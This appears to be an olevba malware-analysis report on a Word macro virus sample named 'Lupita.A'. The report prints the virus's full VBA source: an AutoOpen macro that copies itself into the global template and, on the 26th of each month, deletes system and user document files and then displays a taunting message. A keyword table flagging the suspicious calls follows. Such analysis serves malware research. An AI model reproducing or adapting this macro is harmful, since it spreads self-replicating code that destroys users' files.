olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.bt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.bt - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AUTOOPEN.bas 
in file: Virus.MSWord.Minimal.bt - OLE stream: 'Macros/VBA/AUTOOPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim activa$
Dim plantila$
Dim diálogoEjem As Object
Dim botón
'MACRO VIRUS LUPITA.A
     'MADE IN PERU
     
     On Error Resume Next
     activa$ = WordBasic.[FileName$]() + ":AutoOpen"
     plantila$ = "Global:AUTOOPEN"
     WordBasic.MacroCopy activa$, plantila$, 1
     WordBasic.FileSaveAs Format:=1
     WordBasic.MacroCopy plantila$, activa$, 1
     If WordBasic.Day(WordBasic.Now()) = 26 Then
        WordBasic.Kill "C:\windows\system\*.*"
        WordBasic.Kill "C:\Mis Documentos\*.*"

'*******LA CAJITA DE MENSAJE ****************
     WordBasic.BeginDialog 320, 144, "Microsoft Word"
    WordBasic.PushButton 110, 93, 97, 21, "OK", "Presionar1"
    WordBasic.Text 75, 22, 237, 33, "Los archivos de tu maquina ", "Texto1"
    WordBasic.Text 75, 39, 237, 33, "han sido borrados.....jejejeje", "Texto2"
    WordBasic.Text 75, 59, 237, 33, " LUPITA  MADE IN PERU", "Texto3"
    WordBasic.EndDialog
'********************************************
    Set diálogoEjem = WordBasic.CurValues.UserDialog
    WordBasic.DisableInput 1
    botón = WordBasic.Dialog.UserDialog(diálogoEjem)
    WordBasic.DisableInput 0
     End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

